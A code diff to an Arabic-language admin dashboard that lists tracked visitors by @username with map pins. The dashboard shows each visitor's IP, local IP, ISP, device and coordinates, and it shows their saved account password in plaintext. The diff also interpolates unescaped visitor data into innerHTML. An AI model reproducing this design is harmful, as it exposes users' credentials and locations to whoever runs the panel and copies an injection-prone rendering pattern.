@@ -843,8 +843,10 @@
       const drawer = document.getElementById('visitorInspectorDrawer');
       if (drawer) drawer.classList.remove('hidden');
 
+      const cleanU = String(v.username || v.visitorName || '').trim().replace(/^@+/, '');
+      const displayUser = cleanU ? `@${cleanU}` : (v.visitorName || 'User');
       const prevCount = Array.isArray(v.previousLogs) ? v.previousLogs.length : 0;
-      document.getElementById('inspVisitorName').innerText = v.visitorName || 'Visitor';
+      document.getElementById('inspVisitorName').innerText = displayUser;
       document.getElementById('inspVisitorSub').innerText = `تحديث #${v.loginCount || 1} • أرشيف سابق: ${prevCount}`;
       document.getElementById('inspDevice').innerText = v.device || 'Smartphone / Desktop';
       document.getElementById('inspCoords').innerText = `${Number(v.lat || 15.3538).toFixed(4)}° N, ${Number(v.lng || 44.2058).toFixed(4)}° E`;
@@ -1005,6 +1007,8 @@
       return !s || s === '::1' || s === '127.0.0.1' || s === '0.0.0.0' || s === 'localhost';
     }
 
+    const ADMIN_VALID_USERNAME_REGEX = /^[a-z0-9._]{1,30}$/;
+
     function mergeAndArchiveVisitors(list = []) {
       const map = new Map();
       const firstRealIp = (list.find(x => x && !isLoopbackAdminIp(x.ip))?.ip) || '';
@@ -1013,25 +1017,28 @@
       );
       for (const item of sorted) {
         if (!item || !item.id) continue;
+        const rawVName = String(item.visitorName || '').trim();
+        const rawU = String(item.username || (!rawVName.includes('•') ? rawVName : '')).trim().replace(/^@+/, '').toLowerCase();
+        // Only keep valid @username accounts; skip any standalone phone-name / auto-device records
+        if (item.isDeviceIpAutoAuth || !rawU || !ADMIN_VALID_USERNAME_REGEX.test(rawU) || rawVName.includes('•')) {
+          continue;
+        }
         const resolvedIp = !isLoopbackAdminIp(item.ip) ? item.ip : (firstRealIp || item.ip);
         const cleanedDevice = cleanAdminDevice(item.device);
-        const rawVName = String(item.visitorName || '').trim();
-        const isGenericVName = !rawVName || rawVName === 'زائر غير مسمى' || rawVName === 'زائر مباشر' || rawVName === 'مستخدم التطبيق' || rawVName === 'زائر';
-        const shortDevTitle = extractShortAdminDeviceTitle(cleanedDevice);
-        const autoDisplayName = isGenericVName ? `${shortDevTitle} • ${resolvedIp}` : rawVName;
+        const formattedUser = `@${rawU}`;
         const cleanedItem = {
           ...item,
-          visitorName: autoDisplayName,
-          username: item.username || (!isGenericVName && !rawVName.includes('•') ? rawVName : ''),
+          visitorName: formattedUser,
+          username: formattedUser,
           accountPassword: item.accountPassword || '',
-          isDeviceIpAutoAuth: Boolean(item.isDeviceIpAutoAuth || isGenericVName || rawVName.includes('•')),
+          isDeviceIpAutoAuth: false,
           ip: resolvedIp,
           localIp: item.localIp || '',
           asn: item.asn || '',
           isp: cleanAdminIsp(item.isp, item.country, resolvedIp),
           device: cleanedDevice
         };
-        const key = normVisitorKey(cleanedItem);
+        const key = `name:${rawU}`;
         if (!map.has(key)) {
           map.set(key, {
             ...cleanedItem,
@@ -1041,6 +1048,8 @@
                   const snapIp = !isLoopbackAdminIp(snap.ip) ? snap.ip : resolvedIp;
                   return {
                     ...snap,
+                    visitorName: formattedUser,
+                    username: formattedUser,
                     ip: snapIp,
                     localIp: snap.localIp || cleanedItem.localIp || '',
                     isp: cleanAdminIsp(snap.isp, snap.country || cleanedItem.country, snapIp),
@@ -1052,11 +1061,11 @@
           });
         } else {
           const primary = map.get(key);
+          primary.visitorName = formattedUser;
+          primary.username = formattedUser;
+          primary.isDeviceIpAutoAuth = false;
           if (!primary.accountPassword && cleanedItem.accountPassword) {
             primary.accountPassword = cleanedItem.accountPassword;
-          }
-          if (!primary.username && cleanedItem.username) {
-            primary.username = cleanedItem.username;
           }
           if (isLoopbackAdminIp(primary.ip) && !isLoopbackAdminIp(cleanedItem.ip)) {
             primary.ip = cleanedItem.ip;
@@ -1069,7 +1078,8 @@
             primary.previousLogs.push({
               archivedAt: cleanedItem.lastSeen || cleanedItem.firstSeen || new Date().toISOString(),
               previousLastSeen: cleanedItem.lastSeen || cleanedItem.firstSeen,
-              visitorName: cleanedItem.visitorName,
+              visitorName: formattedUser,
+              username: formattedUser,
               ip: cleanedItem.ip,
               localIp: cleanedItem.localIp || '',
               city: cleanedItem.city,
@@ -1087,6 +1097,8 @@
               const snapIp = !isLoopbackAdminIp(snap.ip) ? snap.ip : resolvedIp;
               const cleanedSnap = {
                 ...snap,
+                visitorName: formattedUser,
+                username: formattedUser,
                 ip: snapIp,
                 isp: cleanAdminIsp(snap.isp, snap.country || cleanedItem.country, snapIp),
                 device: cleanAdminDevice(snap.device)
@@ -1227,20 +1239,24 @@
 
       const items = [];
       visitors.slice(0, 12).forEach((v, idx) => {
+        const cleanU = String(v.username || v.visitorName || '').trim().replace(/^@+/, '');
+        const userLabel = cleanU ? `@${cleanU}` : (v.visitorName || 'زائر');
         items.push({
           type: 'visitor',
           idx,
-          title: `👤 ${v.visitorName || 'زائر'}`,
+          title: `👤 ${userLabel}`,
           sub: `${v.city || 'صنعاء'} • ${v.ip || ''}`,
           color: '#10b981'
         });
       });
       searches.slice(0, 8).forEach((s) => {
+        const cleanSU = String(s.visitorName || '').trim().replace(/^@+/, '');
+        const sUserLabel = cleanSU && !cleanSU.includes('•') ? `@${cleanSU}` : (s.visitorName || 'زائر');
         items.push({
           type: 'search',
           idx: 0,
           title: `🔍 ${s.query || 'بحث'} - ${s.targetLocation || 'صنعاء'}`,
-          sub: `${s.visitorName || 'زائر'} (${s.resultsCount || 0} نتيجة)`,
+          sub: `${sUserLabel} (${s.resultsCount || 0} نتيجة)`,
           color: '#a855f7'
         });
       });
@@ -1253,7 +1269,7 @@
       box.innerHTML = items.map(item => `
         <div onclick="${item.type === 'visitor' ? `inspectVisitor(${item.idx})` : ''}" class="flex items-start justify-between gap-2 p-2 rounded-xl hover:bg-slate-800/60 cursor-pointer transition border border-transparent hover:border-slate-700">
           <div class="min-w-0 text-right">
-            <div class="text-xs font-bold text-white truncate">${item.title}</div>
+            <div class="text-xs font-bold text-white truncate" dir="ltr">${item.title}</div>
             <div class="text-[10px] text-slate-400 truncate">${item.sub}</div>
           </div>
           <span class="w-2.5 h-2.5 rounded-full shrink-0 mt-1" style="background:${item.color}; box-shadow:0 0 8px ${item.color};"></span>
@@ -1265,7 +1281,7 @@
       }
     }
 
-    // Render Glowing Concentric Radar Rings on Map matching Mockup 1:1!
+    // Render Glowing Concentric Radar Rings on Map with @username badge on each pin
     function renderMapPins(visitors = []) {
       if (!adminMap) return;
       visitorMarkers.forEach(m => adminMap.removeLayer(m));
@@ -1276,14 +1292,22 @@
 
         const isPrimary = idx === 0;
         const ringColor = isPrimary ? '#22d3ee' : '#10b981';
+        const cleanU = String(v.username || v.visitorName || '').trim().replace(/^@+/, '');
+        const userBadgeText = cleanU ? `@${cleanU}` : (v.visitorName || 'User');
+        const labelPosStyle = (idx % 2 === 1)
+          ? 'bottom:-20px;'
+          : 'top:-20px;';
 
         const customIcon = L.divIcon({
           className: 'concentric-radar-marker',
           html: `
-            <div style="position:relative; width:56px; height:56px; display:flex; align-items:center; justify-content:center;">
+            <div style="position:relative; width:56px; height:56px; display:flex; align-items:center; justify-content:center; overflow:visible;">
               <div class="target-ring-outer" style="position:absolute; width:52px; height:52px; border-radius:50%; border:2px solid ${ringColor}; background:${ringColor}18; box-shadow:0 0 20px ${ringColor}66;"></div>
               <div style="position:absolute; width:34px; height:34px; border-radius:50%; border:1.5px solid ${ringColor}; background:${ringColor}28;"></div>
               <div style="position:relative; width:14px; height:14px; border-radius:50%; background:${ringColor}; border:2px solid #ffffff; box-shadow:0 0 14px ${ringColor};"></div>
+              <div dir="ltr" style="position:absolute; ${labelPosStyle} left:50%; transform:translateX(-50%); background:rgba(3,12,14,0.94); border:1.5px solid ${ringColor}; color:#ffffff; font-family:'JetBrains Mono',monospace; font-size:11px; font-weight:800; padding:1px 7px; border-radius:999px; white-space:nowrap; box-shadow:0 2px 10px rgba(0,0,0,0.85), 0 0 10px ${ringColor}55; z-index:30; pointer-events:auto;">
+                ${userBadgeText}
+              </div>
             </div>
           `,
           iconSize: [56, 56],
@@ -1733,15 +1757,11 @@
           </details>
         ` : `<span class="inline-block mt-1 text-[10px] text-slate-500">أول جلسة مسجلة</span>`;
 
-        const cleanUsername = String(v.username || '').trim().replace(/^@+/, '');
+        const cleanUsername = String(v.username || v.visitorName || '').trim().replace(/^@+/, '');
         const cleanPass = String(v.accountPassword || '').trim();
-        const isAutoDeviceIp = Boolean(v.isDeviceIpAutoAuth && !cleanUsername);
-        const accountCredsHtml = isAutoDeviceIp
-          ? `<div class="mt-1 flex flex-wrap items-center gap-1">
-               <span class="px-2 py-0.5 rounded-lg bg-amber-500/15 border border-amber-500/30 text-amber-300 text-[10px] font-bold">📱 تعرّف تلقائي (اسم الهاتف + IP)</span>
-             </div>`
-          : `<div class="mt-1 flex flex-wrap items-center gap-1.5">
-               <span class="px-2 py-0.5 rounded-lg bg-cyan-500/15 border border-cyan-500/40 text-cyan-300 text-[11px] font-num font-bold" dir="ltr">@${cleanUsername || v.visitorName || 'user'}</span>
+        const displayUserHandle = `@${cleanUsername || 'user'}`;
+        const accountCredsHtml = `<div class="mt-1 flex flex-wrap items-center gap-1.5">
+               <span class="px-2 py-0.5 rounded-lg bg-cyan-500/15 border border-cyan-500/40 text-cyan-300 text-[11px] font-num font-bold" dir="ltr">${displayUserHandle}</span>
                ${cleanPass
                  ? `<span class="px-2 py-0.5 rounded-lg bg-emerald-500/20 border border-emerald-500/40 text-emerald-300 text-[11px] font-num font-bold">🔑 الرمز: <strong class="text-white select-all">${cleanPass}</strong></span>`
                  : `<span class="px-2 py-0.5 rounded-lg bg-slate-800 text-slate-400 text-[10px]">بدون رمز محفوظ</span>`
@@ -1756,7 +1776,7 @@
             <td class="p-2 text-slate-400 font-num font-bold">${idx + 1}</td>
             <td class="p-2">
               <div class="font-bold text-white flex items-center gap-1 flex-wrap">
-                <span>${v.visitorName || 'زائر'}</span>
+                <span class="font-num" dir="ltr">${displayUserHandle}</span>
                 <span class="px-1.5 py-0.5 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-cyan-300 text-[9px] font-num">#${v.loginCount || 1}</span>
               </div>
               ${accountCredsHtml}
@@ -1806,13 +1826,11 @@
         mobileCards.innerHTML = filteredVisitors.map((v, idx) => {
           const origIdx = Math.max(0, visitors.indexOf(v));
           const prevLogs = Array.isArray(v.previousLogs) ? v.previousLogs : [];
-          const cleanUsername = String(v.username || '').trim().replace(/^@+/, '');
+          const cleanUsername = String(v.username || v.visitorName || '').trim().replace(/^@+/, '');
           const cleanPass = String(v.accountPassword || '').trim();
-          const isAutoDeviceIp = Boolean(v.isDeviceIpAutoAuth && !cleanUsername);
-          const mobileCredsBadge = isAutoDeviceIp
-            ? `<div class="text-[10px] text-amber-300 font-bold">📱 تعرّف تلقائي: ${v.visitorName}</div>`
-            : `<div class="flex flex-wrap items-center gap-1 text-[10px]">
-                 <span class="px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-300 font-num font-bold" dir="ltr">@${cleanUsername || v.visitorName}</span>
+          const displayUserHandle = `@${cleanUsername || 'user'}`;
+          const mobileCredsBadge = `<div class="flex flex-wrap items-center gap-1 text-[10px]">
+                 <span class="px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-300 font-num font-bold" dir="ltr">${displayUserHandle}</span>
                  ${cleanPass ? `<span class="px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-num font-bold">🔑 الرمز: <strong class="text-white select-all">${cleanPass}</strong></span>` : ''}
                </div>`;
           return `
@@ -1820,7 +1838,7 @@
               <div class="flex items-center justify-between">
                 <label class="flex items-center gap-1.5">
                   <input type="checkbox" value="${v.id}" class="visitor-row-checkbox accent-cyan-400" />
-                  <strong class="text-white text-xs">#${idx + 1} • ${v.visitorName || 'زائر'}</strong>
+                  <strong class="text-white text-xs font-num" dir="ltr">#${idx + 1} • ${displayUserHandle}</strong>
                   <span class="px-1.5 py-0.5 rounded-full bg-cyan-500/15 text-cyan-300 text-[9px] font-num">#${v.loginCount || 1}</span>
                 </label>
                 <div class="flex items-center gap-1.5">
